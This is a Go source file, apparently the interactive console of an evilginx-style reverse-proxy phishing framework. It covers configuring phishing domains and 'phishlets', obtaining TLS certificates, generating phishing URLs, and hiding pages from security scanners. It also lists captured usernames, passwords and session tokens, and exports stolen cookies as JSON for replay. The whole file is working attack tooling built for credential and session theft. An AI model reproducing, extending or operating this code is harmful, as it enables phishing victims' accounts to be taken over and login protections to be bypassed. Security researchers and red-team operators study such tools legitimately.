package core

import (
	"encoding/json"
	"fmt"
	"bufio"
	"io"
	"os"
	"net/url"
	"strconv"
	"strings"
	"time"

	"../database"
	"../log"
	"../parser"

	"github.com/chzyer/readline"
	"github.com/fatih/color"
)

const (
	DEFAULT_PROMPT = ": "
	LAYER_TOP      = 1
)

type Terminal struct {
	rl        *readline.Instance
	completer *readline.PrefixCompleter
	cfg       *Config
	crt_db    *CertDb
	db        *database.Database
	hlp       *Help
	developer bool
}

func NewTerminal(cfg *Config, crt_db *CertDb, db *database.Database, developer bool) (*Terminal, error) {
	var err error
	t := &Terminal{
		cfg:       cfg,
		crt_db:    crt_db,
		db:        db,
		developer: developer,
	}

	t.createHelp()
	t.completer = t.hlp.GetPrefixCompleter(LAYER_TOP)
	/*
		t.completer = readline.NewPrefixCompleter(
			readline.PcItem("server"),
			readline.PcItem("ip"),
			readline.PcItem("status"),
			readline.PcItem("phishlet", readline.PcItem("show"), readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("hostname"), readline.PcItem("url")),
			readline.PcItem("sessions", readline.PcItem("delete", readline.PcItem("all"))),
			readline.PcItem("exit"),
		)
	*/
	t.rl, err = readline.NewEx(&readline.Config{
		Prompt:              DEFAULT_PROMPT,
		AutoComplete:        t.completer,
		InterruptPrompt:     "^C",
		EOFPrompt:           "exit",
		FuncFilterInputRune: t.filterInput,
	})
	if err != nil {
		return nil, err
	}
	return t, nil
}

func (t *Terminal) Close() {
	t.rl.Close()
}

func (t *Terminal) output(s string, args ...interface{}) {
	out := fmt.Sprintf(s, args...)
	fmt.Fprintf(color.Output, "\n%s\n\n", out)
}

func (t *Terminal) ProcessResourceFile(rc string) ([]string, error){
	file, err := os.Open(rc)
	if err != nil {
		log.Error("error opening resource file: %v", err)
	}
	defer file.Close()

	var lines []string
	var line string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line = scanner.Text()
		fmt.Println(line)
		lines = append(lines, line)
	}

	return lines, scanner.Err()
}

func (t *Terminal) ProcessCommand(line string) bool {

	line = strings.TrimSpace(line)

	args, err := parser.Parse(line)
	if err != nil {
		log.Error("syntax error: %v", err)
	}

	argn := len(args)
	if argn == 0 {
		t.checkStatus()
		return false
	}

	do_quit := false
	cmd_ok := false
	switch args[0] {
		case "clear":
			cmd_ok = true
			readline.ClearScreen(color.Output)
		case "config":
			cmd_ok = true
			err := t.handleConfig(args[1:])
			if err != nil {
				log.Error("config: %v", err)
			}
		case "session", "sessions":
			cmd_ok = true
			err := t.handleSessions(args[1:])
			if err != nil {
				log.Error("sessions: %v", err)
			}
		case "phishlet", "phishlets":
			cmd_ok = true
			err := t.handlePhishlets(args[1:])
			if err != nil {
				log.Error("phishlets: %v", err)
			}
		case "help":
			cmd_ok = true
			if len(args) == 2 {
				if err := t.hlp.PrintBrief(args[1]); err != nil {
					log.Error("help: %v", err)
				}
			} else {
				t.hlp.Print(0)
			}
		case "q", "quit", "exit":
			do_quit = true
			cmd_ok = true
		default:
			log.Error("unknown command: %s", args[0])
			cmd_ok = true
	}
	if !cmd_ok {
		log.Error("invalid syntax: %s", line)
	}
	t.checkStatus()

	return do_quit
}

func (t *Terminal) DoWork() {
	var do_quit = false

	t.checkStatus()
	log.SetReadline(t.rl)

	t.cfg.refreshActiveHostnames()
	t.updateCertificates("")

	for !do_quit {
		line, err := t.rl.Readline()
		if err == readline.ErrInterrupt {
			log.Info("type 'exit' in order to quit")
			continue
		} else if err == io.EOF {
			break
		}

		do_quit = t.ProcessCommand(line)		
	}
}

func (t *Terminal) handleConfig(args []string) error {
	pn := len(args)
	if pn == 0 {
		keys := []string{"domain", "ip", "redirect_key", "verification_key", "verification_token", "redirect_url"}
		vals := []string{t.cfg.baseDomain, t.cfg.serverIP, t.cfg.redirectParam, t.cfg.verificationParam, t.cfg.verificationToken, t.cfg.redirectUrl}
		log.Printf("\n%s\n", AsRows(keys, vals))
		return nil
	} else if pn == 2 {
		switch args[0] {
		case "domain":
			t.cfg.SetBaseDomain(args[1])
			t.cfg.ResetAllSites()
			return nil
		case "ip":
			t.cfg.SetServerIP(args[1])
			return nil
		case "redirect_key":
			t.cfg.SetRedirectParam(args[1])
			log.Warning("you need to regenerate your phishing urls after this change")
			return nil
		case "verification_key":
			t.cfg.SetVerificationParam(args[1])
			log.Warning("you need to regenerate your phishing urls after this change")
			return nil
		case "verification_token":
			t.cfg.SetVerificationToken(args[1])
			log.Warning("you need to regenerate your phishing urls after this change")
			return nil
		case "redirect_url":
			_, err := url.ParseRequestURI(args[1])
			if err != nil {
				return err
			}
			t.cfg.SetRedirectUrl(args[1])
			return nil
		}
	}
	return fmt.Errorf("invalid syntax: %s", args)
}

func (t *Terminal) handleSessions(args []string) error {
	lblue := color.New(color.FgHiBlue)
	dgray := color.New(color.FgHiBlack)
	lgreen := color.New(color.FgHiGreen)
	yellow := color.New(color.FgYellow)
	lred := color.New(color.FgHiRed)

	pn := len(args)
	if pn == 0 {
		cols := []string{"id", "phishlet", "username", "password", "tokens", "remote ip", "time"}
		sessions, err := t.db.ListSessions()
		if err != nil {
			return err
		}
		if len(sessions) == 0 {
			log.Info("no saved sessions found")
			return nil
		}
		var rows [][]string
		for _, s := range sessions {
			tcol := dgray.Sprintf("none")
			if len(s.Tokens) > 0 {
				tcol = lgreen.Sprintf("captured")
			}
			row := []string{strconv.Itoa(s.Id), lred.Sprintf(s.Phishlet), lblue.Sprintf(truncateString(s.Username, 24)), lblue.Sprintf(truncateString(s.Password, 24)), tcol, yellow.Sprintf(s.RemoteAddr), time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04")}
			rows = append(rows, row)
		}
		log.Printf("\n%s\n", AsTable(cols, rows))
		return nil
	} else if pn == 1 {
		id, err := strconv.Atoi(args[0])
		if err != nil {
			return err
		}
		sessions, err := t.db.ListSessions()
		if err != nil {
			return err
		}
		if len(sessions) == 0 {
			log.Info("no saved sessions found")
			return nil
		}
		s_found := false
		for _, s := range sessions {
			if s.Id == id {
				pl, err := t.cfg.GetPhishlet(s.Phishlet)
				if err != nil {
					log.Error("%v", err)
					break
				}

				s_found = true
				tcol := dgray.Sprintf("empty")
				if len(s.Tokens) > 0 {
					tcol = lgreen.Sprintf("captured")
				}

				keys := []string{"id", "phishlet", "username", "password", "tokens", "landing url", "user-agent", "remote ip", "create time", "update time"}
				vals := []string{strconv.Itoa(s.Id), lred.Sprintf(s.Phishlet), lblue.Sprintf(s.Username), lblue.Sprintf(s.Password), tcol, yellow.Sprintf(s.LandingURL), dgray.Sprintf(s.UserAgent), yellow.Sprintf(s.RemoteAddr), dgray.Sprintf(time.Unix(s.CreateTime, 0).Format("2006-01-02 15:04")), dgray.Sprintf(time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04"))}
				log.Printf("\n%s\n", AsRows(keys, vals))

				if len(s.Tokens) > 0 {
					json_tokens := t.tokensToJSON(pl, s.Tokens)
					t.output("%s", json_tokens)
				}
				break
			}
		}
		if !s_found {
			return fmt.Errorf("id %d not found", id)
		}
		return nil
	} else if pn == 2 {
		switch args[0] {
		case "delete":
			if args[1] == "all" {
				sessions, err := t.db.ListSessions()
				if err != nil {
					return err
				}
				if len(sessions) == 0 {
					break
				}
				for _, s := range sessions {
					err = t.db.DeleteSessionById(s.Id)
					if err != nil {
						log.Warning("delete: %v", err)
					} else {
						log.Info("deleted session with ID: %d", s.Id)
					}
				}
				t.db.Flush()
				return nil
			} else {
				rc := strings.Split(args[1], ",")
				for _, pc := range rc {
					pc = strings.TrimSpace(pc)
					rd := strings.Split(pc, "-")
					if len(rd) == 2 {
						b_id, err := strconv.Atoi(strings.TrimSpace(rd[0]))
						if err != nil {
							log.Error("delete: %v", err)
							break
						}
						e_id, err := strconv.Atoi(strings.TrimSpace(rd[1]))
						if err != nil {
							log.Error("delete: %v", err)
							break
						}
						for i := b_id; i <= e_id; i++ {
							err = t.db.DeleteSessionById(i)
							if err != nil {
								log.Warning("delete: %v", err)
							} else {
								log.Info("deleted session with ID: %d", i)
							}
						}
					} else if len(rd) == 1 {
						b_id, err := strconv.Atoi(strings.TrimSpace(rd[0]))
						if err != nil {
							log.Error("delete: %v", err)
							break
						}
						err = t.db.DeleteSessionById(b_id)
						if err != nil {
							log.Warning("delete: %v", err)
						} else {
							log.Info("deleted session with ID: %d", b_id)
						}
					}
				}
				t.db.Flush()
				return nil
			}
		}
	}
	return fmt.Errorf("invalid syntax: %s", args)
}

func (t *Terminal) handlePhishlets(args []string) error {
	pn := len(args)

	if pn == 0 {
		t.output("%s", t.sprintPhishletStatus(""))
		return nil
	} else if pn == 2 {
		switch args[0] {
		case "enable":
			_, err := t.cfg.GetPhishlet(args[1])
			if err != nil {
				log.Error("%v", err)
				break
			}
			domain, _ := t.cfg.GetSiteDomain(args[1])
			if domain == "" {
				return fmt.Errorf("you need to set hostname for phishlet '%s', first. type: phishlet hostname %s your.hostame.domain.com", args[1], args[1])
			}
			err = t.cfg.SetSiteEnabled(args[1])
			if err != nil {
				return err
			}
			t.updateCertificates(args[1])
			return nil
		case "disable":
			err := t.cfg.SetSiteDisabled(args[1])
			if err != nil {
				return err
			}
			return nil
		case "hide":
			err := t.cfg.SetSiteHidden(args[1], true)
			if err != nil {
				return err
			}
			return nil
		case "unhide":
			err := t.cfg.SetSiteHidden(args[1], false)
			if err != nil {
				return err
			}
			return nil
		case "get-url":
			return fmt.Errorf("incorrect number of arguments")
		case "get-hosts":
			pl, err := t.cfg.GetPhishlet(args[1])
			if err != nil {
				return err
			}
			bhost, ok := t.cfg.GetSiteDomain(pl.Site)
			if !ok || len(bhost) == 0 {
				return fmt.Errorf("no hostname set for phishlet '%s'", pl.Name)
			}
			out := ""
			hosts := pl.GetPhishHosts()
			for n, h := range hosts {
				if n > 0 {
					out += "\n"
				}
				out += t.cfg.GetServerIP() + " " + h
			}
			t.output("%s", out)
			return nil
		}
	} else if pn == 3 {
		switch args[0] {
		case "hostname":
			_, err := t.cfg.GetPhishlet(args[1])
			if err != nil {
				return err
			}
			if ok := t.cfg.SetSiteHostname(args[1], args[2]); ok {
				t.cfg.SetSiteDisabled(args[1])
			}
			return nil
		case "get-url":
			pl, err := t.cfg.GetPhishlet(args[1])
			if err != nil {
				return err
			}
			bhost, ok := t.cfg.GetSiteDomain(pl.Site)
			if !ok || len(bhost) == 0 {
				return fmt.Errorf("no hostname set for phishlet '%s'", pl.Name)
			}
			urls, err := pl.GetLandingUrls(args[2])
			if err != nil {
				return err
			}
			out := ""
			n := 0
			yellow := color.New(color.FgYellow)
			for _, u := range urls {
				if n > 0 {
					out += "\n"
				}
				out += yellow.Sprint(u)
				n += 1
			}
			t.output("%s", out)
			return nil
		}
	}
	return fmt.Errorf("invalid syntax: %s", args)
}

func (t *Terminal) createHelp() {
	h, _ := NewHelp()
	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.", LAYER_TOP,
		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ip"), readline.PcItem("redirect_key"), readline.PcItem("verification_key"), readline.PcItem("verification_token"), readline.PcItem("redirect_url")))
	h.AddSubCommand("config", nil, "", "show all configuration variables")
	h.AddSubCommand("config", []string{"domain"}, "domain <domain>", "set base domain for all phishlets (e.g. evilsite.com)")
	h.AddSubCommand("config", []string{"ip"}, "ip <ip_address>", "set ip address of the current server")
	h.AddSubCommand("config", []string{"redirect_key"}, "redirect_key <name>", "change name of the redirect parameter in phishing url (phishing urls will need to be regenerated)")
	h.AddSubCommand("config", []string{"verification_key"}, "verification_key <name>", "change name of the verification parameter in phishing url (phishing urls will need to be regenerated)")
	h.AddSubCommand("config", []string{"verification_token"}, "verification_token <token>", "change the value of the verification token (phishing urls will need to be regenerated)")
	h.AddSubCommand("config", []string{"redirect_url"}, "redirect_url <url>", "change the url where all unauthorized requests will be redirected to (phishing urls will need to be regenerated)")

	h.AddCommand("phishlets", "general", "manage phishlets configuration", "Shows status of all available phishlets and allows to change their parameters and enabled status.", LAYER_TOP,
		readline.PcItem("phishlets", readline.PcItem("hostname", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("enable", readline.PcItemDynamic(t.phishletPrefixCompleter)),
			readline.PcItem("disable", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("hide", readline.PcItemDynamic(t.phishletPrefixCompleter)),
			readline.PcItem("unhide", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-url", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-hosts", readline.PcItemDynamic(t.phishletPrefixCompleter))))
	h.AddSubCommand("phishlets", nil, "", "show status of all available phishlets")
	h.AddSubCommand("phishlets", []string{"hostname"}, "hostname <phishlet> <hostname>", "set hostname for given phishlet (e.g. this.is.not.a.phishing.site.evilsite.com)")
	h.AddSubCommand("phishlets", []string{"enable"}, "enable <phishlet>", "enables phishlet and requests ssl/tls certificate if needed")
	h.AddSubCommand("phishlets", []string{"disable"}, "disable <phishlet>", "disables phishlet")
	h.AddSubCommand("phishlets", []string{"hide"}, "hide <phishlet>", "hides the phishing page, logging and redirecting all requests to it (good for avoiding scanners when sending out phishing links)")
	h.AddSubCommand("phishlets", []string{"unhide"}, "unhide <phishlet>", "makes the phishing page available and reachable from the outside")
	h.AddSubCommand("phishlets", []string{"get-url"}, "get-url <phishlet> <redirect_url>", "generates phishing url with redirection on successful authentication")
	h.AddSubCommand("phishlets", []string{"get-hosts"}, "get-hosts <phishlet>", "generates entries for hosts file in order to use localhost for testing")

	h.AddCommand("sessions", "general", "manage sessions and captured tokens with credentials", "Shows all captured credentials and authentication tokens. Allows to view full history of visits and delete logged sessions.", LAYER_TOP,
		readline.PcItem("sessions", readline.PcItem("delete", readline.PcItem("all"))))
	h.AddSubCommand("sessions", nil, "", "show history of all logged visits and captured credentials")
	h.AddSubCommand("sessions", nil, "<id>", "show session details, including captured authentication tokens, if available")
	h.AddSubCommand("sessions", []string{"delete"}, "delete <id>", "delete logged session with <id> (ranges with separators are allowed e.g. 1-7,10-12,15-25)")
	h.AddSubCommand("sessions", []string{"delete", "all"}, "delete all", "delete all logged sessions")

	h.AddCommand("clear", "general", "clears the screen", "Clears the screen.", LAYER_TOP,
		readline.PcItem("clear"))

	t.hlp = h
}

func (t *Terminal) tokensToJSON(pl *Phishlet, tokens map[string]map[string]*database.Token) string {
	type Cookie struct {
		Path           string `json:"path"`
		Domain         string `json:"domain"`
		ExpirationDate int64  `json:"expirationDate"`
		Value          string `json:"value"`
		Name           string `json:"name"`
		HttpOnly       bool   `json:"httpOnly,omitempty"`
		HostOnly       bool   `json:"hostOnly,omitempty"`
	}

	var cookies []*Cookie
	for domain, tmap := range tokens {
		for k, v := range tmap {
			c := &Cookie{
				Path:           v.Path,
				Domain:         domain,
				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
				Value:          v.Value,
				Name:           k,
				HttpOnly:       v.HttpOnly,
			}
			if domain[:1] != "." {
				c.HostOnly = true
			}
			if c.Path == "" {
				c.Path = "/"
			}
			cookies = append(cookies, c)
		}
	}

	json, _ := json.Marshal(cookies)
	return string(json)
}

func (t *Terminal) checkStatus() {
	if t.cfg.GetBaseDomain() == "" {
		log.Warning("server domain not set! type: config domain <domain>")
	}
	if t.cfg.GetServerIP() == "" {
		log.Warning("server ip not set! type: config ip <ip_address>")
	}
}

func (t *Terminal) updateCertificates(site string) {
	for _, s := range t.cfg.GetEnabledSites() {
		if site == "" || s == site {
			pl, err := t.cfg.GetPhishlet(s)
			if err != nil {
				log.Error("%v", err)
				continue
			}
			if t.developer {
				log.Info("developer mode is on - will use self-signed SSL/TLS certificates for phishlet '%s'", s)
			} else {
				log.Info("setting up certificates for phishlet '%s'...", s)
				err = t.crt_db.SetupCertificate(s, pl.GetPhishHosts())
				if err != nil {
					log.Fatal("%v", err)
					t.cfg.SetSiteDisabled(s)
				} else {
					log.Success("successfully set up SSL/TLS certificates for domains: %v", pl.GetPhishHosts())
				}
			}
		}
	}
}

func (t *Terminal) sprintPhishletStatus(site string) string {
	ret := ""
	higreen := color.New(color.FgHiGreen)
	hired := color.New(color.FgHiRed)
	hiblue := color.New(color.FgHiBlue)
	yellow := color.New(color.FgYellow)
	hiwhite := color.New(color.FgHiWhite)
	n := 0
	for s, _ := range t.cfg.phishlets {
		if site == "" || s == site {
			pl, err := t.cfg.GetPhishlet(s)
			if err != nil {
				continue
			}

			status := hired.Sprint("disabled")
			if t.cfg.IsSiteEnabled(s) {
				status = higreen.Sprint("enabled")
			}
			hidden_status := higreen.Sprint("available")
			if t.cfg.IsSiteHidden(s) {
				hidden_status = hired.Sprint("hidden")
			}
			if n > 0 {
				ret += "\n\n"
			}
			ret += "  phishlet: " + hiblue.Sprint(s) + "\n"
			ret += "    author: " + hiwhite.Sprint(pl.Author) + "\n"
			ret += "    active: " + status + "\n"
			ret += "    status: " + hidden_status + "\n"
			domain, _ := t.cfg.GetSiteDomain(s)
			ret += "  hostname: " + yellow.Sprint(domain)
			n += 1
		}
	}
	return ret
}

func (t *Terminal) phishletPrefixCompleter(args string) []string {
	return t.cfg.GetPhishletNames()
}

func (t *Terminal) sprintVar(k string, v string) string {
	vc := color.New(color.FgYellow)
	return k + ": " + vc.Sprint(v)
}

func (t *Terminal) filterInput(r rune) (rune, bool) {
	switch r {
	// block CtrlZ feature
	case readline.CharCtrlZ:
		return r, false
	}
	return r, true
}
